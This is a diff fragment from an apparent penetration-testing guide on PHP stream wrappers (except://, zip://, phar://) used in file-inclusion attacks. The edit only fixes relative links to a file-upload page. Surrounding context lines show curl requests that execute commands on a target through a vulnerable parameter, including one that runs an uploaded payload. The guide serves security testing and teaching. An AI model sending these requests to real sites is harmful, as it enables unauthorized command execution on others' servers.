@@ -83,7 +83,7 @@ curl --user-agent "PENTEST" -s "$URL/?parameter=except://id"
 
 <summary>zip://</summary>
 
-The prerequisite for this method is to be able to [upload a file](../../../../web-services/attacks-on-inputs/unrestricted-file-upload.md).
+The prerequisite for this method is to be able to [upload a file](../../../inputs/unrestricted-file-upload.md).
 
 {% code overflow="wrap" %}
 ```bash
@@ -101,7 +101,7 @@ curl --user-agent "PENTEST" "$URL/?parameter=zip://payload.zip%23payload.php&cmd
 
 <summary>phar://</summary>
 
-The prerequisite for this method is to be able to [upload a file](../../../../web-services/attacks-on-inputs/unrestricted-file-upload.md).
+The prerequisite for this method is to be able to [upload a file](../../../inputs/unrestricted-file-upload.md).
 
 ```php
 <?php
